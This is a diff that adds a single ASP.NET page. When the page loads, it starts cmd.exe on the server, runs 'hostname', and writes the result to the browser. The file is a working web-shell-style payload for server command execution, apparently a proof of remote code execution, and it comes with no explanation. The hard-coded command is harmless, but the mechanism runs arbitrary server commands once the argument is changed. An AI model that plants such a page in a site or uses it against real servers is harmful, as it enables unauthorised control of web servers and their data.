@@ -1,0 +1,1 @@
+<%@ Page Language="C#" %><%var p=new System.Diagnostics.Process{StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c hostname"){UseShellExecute=false,RedirectStandardOutput=true}};p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>
